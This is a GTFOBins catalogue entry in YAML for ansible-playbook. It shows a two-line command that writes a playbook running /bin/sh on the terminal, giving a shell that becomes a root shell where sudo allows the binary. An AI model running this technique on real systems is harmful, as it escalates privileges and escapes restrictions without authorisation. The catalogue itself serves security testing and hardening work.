<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/ansible-playbook -->
---
functions:
  shell:
  - code: |-
      echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >/path/to/temp-file
      ansible-playbook /path/to/temp-file
    contexts:
      sudo:
      unprivileged:
...
